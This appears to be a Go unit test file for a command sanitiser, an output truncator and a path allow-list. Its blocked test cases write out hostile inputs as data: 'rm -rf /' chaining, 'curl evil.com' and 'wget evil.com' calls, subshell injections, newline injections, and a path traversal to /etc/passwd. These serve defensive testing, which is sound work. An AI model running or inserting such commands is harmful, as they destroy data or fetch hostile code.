package security

import (
	"strings"
	"testing"
)

func TestSanitiseCommand_AllowsCleanCommands(t *testing.T) {
	clean := []string{
		"ls -la /var/www",
		"df -h",
		"free -m",
		"systemctl status nginx",
		"git log --oneline -20",
	}
	for _, cmd := range clean {
		out, err := SanitiseCommand(cmd)
		if err != nil {
			t.Errorf("unexpected error for clean command %q: %v", cmd, err)
		}
		if out != cmd {
			t.Errorf("expected %q, got %q", cmd, out)
		}
	}
}

func TestSanitiseCommand_BlocksDangerousTokensAndNewlines(t *testing.T) {
	cases := []struct {
		cmd    string
		reason string
	}{
		{"ls -la; rm -rf /", "semicolon chaining"},
		{"echo ok && curl evil.com", "AND chaining"},
		{"ls || wget evil.com", "OR chaining"},
		{"echo `id`", "backtick subshell"},
		{"echo $(whoami)", "dollar subshell"},
		{"echo hello\nrm -rf /", "newline injection"},
		{"cat file\r\nevil_cmd", "crlf injection"},
	}
	for _, tc := range cases {
		t.Run(tc.reason, func(t *testing.T) {
			_, err := SanitiseCommand(tc.cmd)
			if err == nil {
				t.Errorf("expected error for %q (%s), got nil", tc.cmd, tc.reason)
			}
		})
	}
}

func TestSmartTruncate(t *testing.T) {
	small := "Hello, World!\nSecond line"
	if res := SmartTruncate(small, 1000, 10); res != small {
		t.Errorf("expected %q, got %q", small, res)
	}

	var manyLines []string
	for i := 0; i < 500; i++ {
		manyLines = append(manyLines, "line content")
	}
	largeLines := strings.Join(manyLines, "\n")
	res := SmartTruncate(largeLines, 100*1024, 50)
	if !strings.Contains(res, "TRUNCATED") {
		t.Errorf("expected truncation marker in output")
	}
}

func TestIsPathAllowed(t *testing.T) {
	allowed := []string{"/var/log", "/home/user/data"}

	if !IsPathAllowed(allowed, "/var/log/syslog") {
		t.Errorf("expected /var/log/syslog to be allowed")
	}
	if IsPathAllowed(allowed, "/etc/passwd") {
		t.Errorf("expected /etc/passwd to be blocked")
	}
	if IsPathAllowed(allowed, "/var/log/../../etc/passwd") {
		t.Errorf("expected traversal attack to be blocked")
	}
}
